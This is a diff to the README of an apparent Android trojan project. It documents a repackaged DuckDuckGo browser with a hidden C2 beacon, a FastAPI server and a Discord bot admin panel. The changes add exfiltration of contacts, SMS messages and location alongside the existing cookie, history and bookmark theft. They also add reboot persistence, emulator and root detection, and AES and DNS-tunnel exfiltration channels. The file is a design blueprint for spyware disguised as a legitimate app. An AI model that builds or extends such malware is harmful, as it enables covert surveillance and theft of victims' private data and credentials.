@@ -159,15 +159,19 @@ The Discord bot serves as the **admin panel** for the C2 server. It accepts comm
 
 | Command | Arguments | Description |
 |---|---|---|
-| `/show-devices` | — | Lists all managed devices with their status |
+| `/show-devices` | — | Lists all managed devices with emulator (🤖) and root (🔓) badges |
+| `/device-info` | `device` | Full fingerprint: OS, carrier, installed-app count, root/emulator flags |
 | `/set-beacon-interval` | `15` \| `30` \| `60` \| `120` (autocomplete) | Sets the beacon interval (seconds) |
 | `/request-cookies` | — | Shows cached cookies **and** auto-queues a fresh exfiltration for all devices |
 | `/request-history` | `device` (optional, default `*`) | Queues a history exfiltration task |
 | `/request-bookmarks` | `device` (optional, default `*`) | Queues a bookmarks exfiltration task |
+| `/request-contacts` | `device` (optional, default `*`) | Queues a contacts exfiltration task (requires READ_CONTACTS) |
+| `/request-sms` | `device` (optional, default `*`) | Queues an SMS inbox exfiltration task (requires READ_SMS) |
+| `/request-location` | `device` (optional, default `*`) | Returns the last cached GPS fix (no active tracking) |
 | `/set-communication-protocol` | `http` \| `https` \| `dns` (autocomplete) | Sets the exfiltration channel protocol |
 | `/queue-task` | `device`, `task_type`, `parameters` (autocomplete) | Queue a task for a device (or `*` for all) |
 | `/pending-tasks` | — | Show pending task counts per device |
-| `/show-results` | — | Show the latest exfiltrated data per task type per device |
+| `/show-results` | — | Show the latest exfiltrated data per task type per device (with history count) |
 
 > Commands use Discord's native slash command system — type `/` in the chat to see all available commands with autocomplete.
 
@@ -181,7 +185,8 @@ The FastAPI server exposes two groups of endpoints:
 
 | Method | Endpoint | Description |
 |---|---|---|
-| `GET` | `/admin/devices` | List all registered devices |
+| `GET` | `/admin/devices` | List all registered devices (with emulator/root flags) |
+| `GET` | `/admin/device-info/{name}` | Full fingerprint for a specific device |
 | `GET` | `/admin/cookies` | Get cookies from all devices |
 | `GET` | `/admin/results` | Get latest exfiltrated result per task type per device |
 | `POST` | `/admin/beacon-interval` | Set beacon interval |
@@ -193,7 +198,7 @@ The FastAPI server exposes two groups of endpoints:
 
 | Method | Endpoint | Description |
 |---|---|---|
-| `POST` | `/beacon/check-in` | Device registers/updates its presence |
+| `POST` | `/beacon/check-in` | Device registers/updates its presence (sends `is_emulator` flag) |
 | `GET` | `/beacon/tasks/{device_name}` | Device polls for queued tasks (dequeues) |
 | `POST` | `/beacon/result` | Device submits task execution result |
 | `GET` | `/beacon/config` | Get current server configuration |
@@ -213,11 +218,14 @@ The client is a modified DuckDuckGo Android browser with an embedded C2 beacon m
 trojan-ddg/trojan/
 ├── trojan-api/          → Interface contract (BeaconService, PendingCommand)
 └── trojan-impl/         → Implementation
-    ├── C2ApiService.kt      → Retrofit interface aligned with server endpoints
-    ├── C2NetworkModule.kt   → @Named("c2") OkHttp/Retrofit (isolated from DDG)
-    ├── RealBeaconService.kt → Check-in + task polling logic
-    ├── CommandHandler.kt    → Dispatches: request-cookies/history/bookmarks
-    └── BeaconWorker.kt      → Self-rescheduling OneTimeWorkRequest (dynamic interval)
+    ├── C2ApiService.kt        → Retrofit interface aligned with server endpoints
+    ├── C2NetworkModule.kt     → @Named("c2") OkHttp/Retrofit (isolated from DDG)
+    ├── RealBeaconService.kt   → Check-in + task polling logic
+    ├── CommandHandler.kt      → Dispatches exfiltration commands
+    ├── BeaconWorker.kt        → Self-rescheduling OneTimeWorkRequest (dynamic interval)
+    ├── BeaconBootReceiver.kt  → BroadcastReceiver that restarts beacon after reboot
+    ├── AesExfiltrator.kt      → AES-256-CBC encryption for HTTPS channel
+    └── DnsExfiltrator.kt      → DNS tunneling exfiltration
 ```
 
 ### Supported Commands
@@ -227,15 +235,21 @@ trojan-ddg/trojan/
 | `request-cookies` | `{"domains": "google.com,github.com"}` | `CookieManagerProvider` → WebView `CookieManager` | Browser cookies for specified (or default) domains |
 | `request-history` | — | `NavigationHistory` | Browsing URLs, titles, visit counts |
 | `request-bookmarks` | — | `SavedSitesRepository` | All bookmarks and favorites |
+| `request-contacts` | — | `ContactsContract.CommonDataKinds.Phone` | Contact names + phone numbers |
+| `request-sms` | — | `content://sms/inbox` ContentProvider | Up to 50 SMS messages (sender + body) |
+| `request-location` | — | `LocationManager.getLastKnownLocation()` | Lat/lon/accuracy from cached GPS or network fix |
+
+> **READ_CONTACTS** and **READ_SMS** are *dangerous* Android permissions — they are declared in the manifest but require the user to grant them at runtime. If not granted, the handler returns a `"permission denied"` result rather than crashing the beacon.
 
 ### How the Beacon Works
 
 1. `BeaconInitializer` schedules a `OneTimeWorkRequest` with a 15-second initial delay when the app starts
-2. `BeaconWorker` fires and calls `POST /beacon/check-in` to register the device
-3. Then `GET /beacon/tasks/{device_name}` to poll for commands
-4. For each command, `CommandHandler.execute()` gathers the data
-5. Results are sent back via `POST /beacon/result`
-6. The worker reads `beacon_interval` from the server response and schedules the **next** `OneTimeWorkRequest` with that interval (self-rescheduling chain)
+2. `BeaconBootReceiver` re-schedules the beacon (30-second delay) after every device reboot — no user interaction required
+3. `BeaconWorker` fires and calls `POST /beacon/check-in` to register the device
+4. Then `GET /beacon/tasks/{device_name}` to poll for commands
+5. For each command, `CommandHandler.execute()` gathers the data
+6. Results are sent back via `POST /beacon/result`
+7. The worker reads `beacon_interval` from the server response and schedules the **next** `OneTimeWorkRequest` with that interval (self-rescheduling chain)
 
 > **Dynamic intervals:** The admin can change the beacon interval at any time via `/set-beacon-interval`. The client picks up the new value on its next check-in. Valid values: `15`, `30`, `60`, `120` seconds.
 
@@ -243,7 +257,7 @@ trojan-ddg/trojan/
 
 ## 🧪 Running Tests
 
-### Server Tests (78 tests)
+### Server Tests (85 tests)
 
 ```bash
 cd server
@@ -259,7 +273,7 @@ pip install -r requirements.txt -r requirements-dev.txt
 python -m pytest tests/ -v
 ```
 
-### Android Client Tests (36 tests)
+### Android Client Tests (56 tests)
 
 ```bash
 cd trojan-ddg
